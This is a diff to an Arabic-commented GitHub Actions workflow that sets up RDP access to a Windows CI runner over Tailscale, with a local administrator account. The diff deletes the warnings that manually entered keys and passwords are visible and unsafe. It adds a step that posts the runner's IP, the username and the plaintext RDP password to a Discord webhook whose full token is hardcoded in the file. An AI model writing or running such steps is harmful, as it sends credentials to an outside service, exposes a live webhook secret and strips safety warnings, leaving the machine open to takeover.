@@ -4,20 +4,19 @@ on:
   workflow_dispatch:
     inputs:
       duration_minutes:
-        description: "⏱️ كم دقيقة تبقي RDP شغالة؟ (الافتراضي: 60 دقيقة)"
+        description: "⏱️ كم دقيقة تبقي RDP شغالة؟ (الافتراضي: 60)"
         required: false
         default: "60"
       username:
         description: "👤 اسم المستخدم (الافتراضي: rdpuser)"
         required: false
         default: "rdpuser"
-      # تحذير: إدخال هنا سيكون مرئياً في واجهة GitHub عند التشغيل — غير آمن لوضع أسرار حساسة
       tailscale_auth_key:
-        description: "🔐 Tailscale auth key (اختياري — WARNING: مرئي عند التشغيل)"
+        description: "🔐 Tailscale auth key (اختياري — سيُستخدم Secret إن وُجد)"
         required: false
         default: ""
       rdp_password:
-        description: "🔑 RDP password (اختياري — WARNING: مرئي عند التشغيل)"
+        description: "🔑 RDP password (اختياري — سيُستخدم Secret إن وُجد)"
         required: false
         default: ""
 
@@ -35,11 +34,11 @@ jobs:
     timeout-minutes: 400
 
     steps:
-      - name: 📋 التحقق من البيانات
+      - name: 📋 التحقق من المدخلات
         run: |
           $duration = [int]"${{ github.event.inputs.duration_minutes }}"
           if ($duration -lt 1 -or $duration -gt 360) {
-              Write-Error "❌ يجب أن تكون المدة بين 1 و 360 دقيقة"
+              Write-Error "❌ المدة بين 1 و 360 دقيقة"
               exit 1
           }
           Write-Host "✅ المدة: $duration دقيقة"
@@ -49,51 +48,33 @@ jobs:
           Write-Host "📦 تحميل Tailscale..."
           $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
           Invoke-WebRequest -Uri $tsUrl -OutFile "$env:TEMP\ts.msi" -UseBasicParsing
-          
-          Write-Host "⚙️ التثبيت..."
           Start-Process msiexec.exe -ArgumentList "/i", "`"$env:TEMP\ts.msi`"", "/quiet", "/norestart" -Wait
           Remove-Item "$env:TEMP\ts.msi" -Force
           Write-Host "✅ تم التثبيت"
 
-      - name: 🧪 تحضير مفاتيح التشغيل (secrets أو inputs)
+      - name: 🧪 تحضير المفاتيح (Secrets أولاً، ثم المدخلات)
         run: |
-          # حاول الحصول على المفتاح من Secrets أولاً ثم من مدخلات workflow_dispatch
           $tailscaleKey = "${{ secrets.TAILSCALE_AUTH_KEY }}"
           if (-not $tailscaleKey -or $tailscaleKey -eq "") {
             $tailscaleKey = "${{ github.event.inputs.tailscale_auth_key }}"
-            if ($tailscaleKey -and $tailscaleKey -ne "") {
-              Write-Host "⚠️ تستخدم قيمة TAILSCALE_AUTH_KEY المُدخلة يدوياً — هذا غير آمن"
-            }
-          } else {
-            Write-Host "✅ استخدام TAILSCALE_AUTH_KEY من GitHub Secrets"
           }
-
           $rdpPass = "${{ secrets.RDP_PASSWORD }}"
           if (-not $rdpPass -or $rdpPass -eq "") {
             $rdpPass = "${{ github.event.inputs.rdp_password }}"
-            if ($rdpPass -and $rdpPass -ne "") {
-              Write-Host "⚠️ تستخدم قيمة RDP_PASSWORD المُدخلة يدوياً — هذا غير آمن"
-            }
-          } else {
-            Write-Host "✅ استخدام RDP_PASSWORD من GitHub Secrets"
           }
 
           if (-not $tailscaleKey -or $tailscaleKey -eq "") {
-            Write-Error "❌ لم يتم توفير TAILSCALE_AUTH_KEY (إما كـ Secret أو كـ input عند التشغيل)"
+            Write-Error "❌ لم يتم توفير TAILSCALE_AUTH_KEY (لا في Secrets ولا في input)"
             exit 1
           }
           if (-not $rdpPass -or $rdpPass -eq "") {
-            Write-Error "❌ لم يتم توفير RDP_PASSWORD (إما كـ Secret أو كـ input عند التشغيل)"
+            Write-Error "❌ لم يتم توفير RDP_PASSWORD (لا في Secrets ولا في input)"
             exit 1
           }
 
-          # نخزن في متغيّرات بيئة مؤقتة لاستخدامها في الخطوات التالية
-          Write-Host "إعداد المتغيرات البيئية المؤقتة..."
-          Write-Host ("::set-output name=tailscaleKey::" + $tailscaleKey)  # للـ steps القديمة، لكن نستخدم env file أدناه
-          $envFile = "$env:GITHUB_ENV"
-          Add-Content -Path $envFile -Value "TAILSCALE_AUTH_KEY=$tailscaleKey"
-          Add-Content -Path $envFile -Value "RDP_PASSWORD=$rdpPass"
-          Write-Host "✅ المتغيرات معدّة"
+          Add-Content -Path $env:GITHUB_ENV -Value "TAILSCALE_AUTH_KEY=$tailscaleKey"
+          Add-Content -Path $env:GITHUB_ENV -Value "RDP_PASSWORD=$rdpPass"
+          Write-Host "✅ المفاتيح جاهزة"
 
       - name: 🔗 الاتصال بـ Tailscale
         run: |
@@ -102,7 +83,6 @@ jobs:
             --authkey="$env:TAILSCALE_AUTH_KEY" `
             --hostname="gh-runner-${{ github.run_number }}" `
             --accept-routes
-          
           Start-Sleep -Seconds 10
           $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
           Write-Host "✅ IP: $tsIP"
@@ -113,51 +93,28 @@ jobs:
         run: |
           $username = ($env:RDP_USERNAME -replace '[^\w\.-]','').Trim()
           if (-not $username) { $username = 'rdpuser' }
-
-          if (-not $env:RDP_PASSWORD) {
-              Write-Error "❌ RDP_PASSWORD غير موجود في البيئة"
-              exit 1
-          }
-
-          # تحقق بسيط من تعقيد كلمة المرور (يمكنك تعديل القواعد حسب حاجتك)
           $passwordPlain = $env:RDP_PASSWORD.Trim()
           if ($passwordPlain.Length -lt 8) {
-              Write-Error "❌ RDP_PASSWORD قصير للغاية (اقل من 8 أحرف)"
+              Write-Error "❌ RDP_PASSWORD أقل من 8 أحرف"
               exit 1
           }
-
-          try {
-              $password = ConvertTo-SecureString $passwordPlain -AsPlainText -Force
-
-              $existing = Get-LocalUser -Name $username -ErrorAction SilentlyContinue
-              if (-not $existing) {
-                  New-LocalUser -Name $username -Password $password -AccountNeverExpires | Out-Null
-                  Write-Host "✅ Created local user: $username"
-              } else {
-                  Write-Host "🔁 User $username already exists — updating password"
-                  Set-LocalUser -Name $username -Password $password
-              }
-
-              Add-LocalGroupMember -Group "Administrators" -Member $username -ErrorAction SilentlyContinue
-              Add-LocalGroupMember -Group "Remote Desktop Users" -Member $username -ErrorAction SilentlyContinue
-
-              Write-Host "✅ RDP account ready"
-          } catch {
-              Write-Error "❌ Failed to create/update local user: $($_.Exception.Message)"
-              exit 1
+          $password = ConvertTo-SecureString $passwordPlain -AsPlainText -Force
+          $existing = Get-LocalUser -Name $username -ErrorAction SilentlyContinue
+          if (-not $existing) {
+              New-LocalUser -Name $username -Password $password -AccountNeverExpires | Out-Null
+          } else {
+              Set-LocalUser -Name $username -Password $password
           }
+          Add-LocalGroupMember -Group "Administrators" -Member $username -ErrorAction SilentlyContinue
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member $username -ErrorAction SilentlyContinue
+          Write-Host "✅ RDP account ready"
 
-      - name: 🔐 تفعيل RDP بأمان
+      - name: 🔐 تفعيل RDP
         run: |
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
-            -Name "fDenyTSConnections" -Value 0 -Force
-          
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
-            -Name "SecurityLayer" -Value 2 -Force
-          
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 2 -Force
           netsh advfirewall firewall delete rule name="RDP-Tailscale" 2>$null
           netsh advfirewall firewall add rule name="RDP-Tailscale" dir=in action=allow protocol=TCP localport=3389 | Out-Null
-          
           Restart-Service -Name TermService -Force
           Write-Host "✅ RDP جاهز"
 
@@ -166,25 +123,39 @@ jobs:
           $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
           $username = "${{ github.event.inputs.username }}"
           $duration = "${{ github.event.inputs.duration_minutes }}"
-          
           Write-Host ""
           Write-Host "════════════════════════════════════════"
           Write-Host "📍 معلومات RDP"
           Write-Host "════════════════════════════════════════"
           Write-Host "🖥️  السيرفر: $tsIP"
           Write-Host "👤 المستخدم: $username"
-          Write-Host "🔑 كلمة المرور: (أدخلت أثناء التشغيل أو محفوظة في GitHub Secrets)"
+          Write-Host "🔑 كلمة المرور: (موجودة في Secrets)"
           Write-Host "⏱️  المدة: $duration دقيقة"
           Write-Host "════════════════════════════════════════"
+
+      - name: 📨 إرسال المعلومات إلى Discord
+        run: |
+          $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
+          $username = "${{ github.event.inputs.username }}"
+          $password = $env:RDP_PASSWORD
+          $duration = "${{ github.event.inputs.duration_minutes }}"
+          $webhook = "https://discord.com/api/webhooks/1532742345857175673/9hFOxiJ1EMBEKnp8LbTsHXQFyaDj5T7BqQEsSH1fxNDpNE4EtqbHFtaSn3io-be6gQ2U"
+          $payload = @{
+            content = "🔐 **RDP via Tailscale**`n" +
+                      "🖥️ السيرفر: $tsIP`n" +
+                      "👤 المستخدم: $username`n" +
+                      "🔑 كلمة المرور: $password`n" +
+                      "⏱️ المدة: $duration دقيقة"
+          } | ConvertTo-Json
+          Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json"
+          Write-Host "✅ تم الإرسال إلى Discord"
 
       - name: ⏰ الانتظار
         run: |
           $duration = [int]"${{ github.event.inputs.duration_minutes }}"
-          
           for ($i = 1; $i -le $duration; $i++) {
               $remaining = $duration - $i
               Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $remaining دقيقة متبقية..."
               Start-Sleep -Seconds 60
           }
-          
           Write-Host "✅ انتهت الجلسة"
